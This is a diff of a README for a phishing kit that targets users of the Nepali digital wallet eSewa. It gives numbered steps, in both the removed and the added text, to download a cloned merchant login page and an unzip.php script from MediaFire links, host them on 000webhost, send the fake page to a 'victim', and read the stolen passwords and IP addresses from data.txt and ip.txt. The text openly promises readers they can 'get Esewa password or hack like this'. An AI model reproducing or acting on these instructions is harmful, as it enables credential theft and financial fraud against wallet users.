@@ -4,31 +4,24 @@
 This guide will walk you through the process of exploiting Esewa, a popular digital wallet in Nepal, using a credential phishing attack. We will be using 000Webhost as our web hosting service and downloading a script to automate the unzipping process.
 
 ## Steps
+1.Download 'merchant.esewa.com.np.zip' file from given link
+(https://www.mediafire.com/file/qaex61f495wjz9k/merchant.esewa.com.np.zip/file)
+2. Download  the `unzip.php` file also from the provided link https://www.mediafire.com/file/h2vj2fr10hvavze/unzip.php/file
+3. go on any browser and search 000 webhost or go 
+(https://www.000webhost.com/cpanel-login)
 
-1. Download the repository files and the `unzip.php` file from the provided link https://www.mediafire.com/file/h2vj2fr10hvavze/unzip.php/file
-2. Unzip the downloaded repository files.
-3. Host the fake login page on 000Webhost. Here are the steps to do this:
-    a. Sign up for a free account on 000Webhost.
-    b. Log in to your 000Webhost account.
-    c. Click on the "My Sites" tab and then click on the "Create Site" button.
-    d. Choose a domain name for your phishing site (e.g., "esewa-login.00webhostapp.com").
-    e. Select the "Free" hosting plan.
-    f. Click on the "Create Site" button to create your new site.
-    g. Once your site is created, click on the "Manage Site" button.
-    h. Click on the "File Manager" button.
-
-    i. In the File Manager, navigate to the "public_html" directory.
-    j. Upload the repository files to the "public_html" directory.
-    k. Upload the `unzip.php` file to the "public_html" directory.
-    l. Click on the `unzip.php` file and click on "View" to unzip the repository files.
-4. Navigate to the unzipped folder, find the `login.html` file, and click on "View" to see the Esewa login page.
-5. Copy the link of the login page and send it to your target victim.
-6. Once the user enters their credentials on the fake login page, use a tool such as Burp Suite or Wireshark to intercept and capture the credentials.
-7. Use the captured credentials to log in to the user's Esewa account and perform whatever actions you have been authorized to perform.
-8. After the user enters their credentials, a new file named `data.txt` will be created in the "public_html" directory, containing the victim's IP address. The IP address will also be stored in a separate file named `ip.txt`.
-
-## About Developer Bijaya Tamang
-
+4. login/sign up there with your google account or what way you want 
+    5. After login/sign up set your website domain 
+    6. after setup of domain add your password according to showing rules
+       7. Now choose file manager option
+    8. After choosing file manager option go on go ob public_html folder and upload there our 'merchant.esewa.com.np.zip' file and 'unzip.php' file
+    9. Now click on 'unzip.php' file and click view and click unzip archive and double click to back
+    10. Now in file manager click    on refresh now after refrsh you have to see unziped folder 'merchant.esewa.com.np.zip'double click there to view and go on Auth foldrer find 'login.html file'click it and click view
+    11. √Now you can see eSewa login page now copy link of that page and send to your victim
+    12. Now if your victim log in on that page in your file manager of 000webhost there will create a new file name 'data.txt' and 'ip.txt'
+    13. To see victims pass click on 'data.txt' file and if you want get victim IP Address click onn 'ip.txt'
+##
+So friends you can get Esewa password or hack like this
 
 
 ## Conclusion
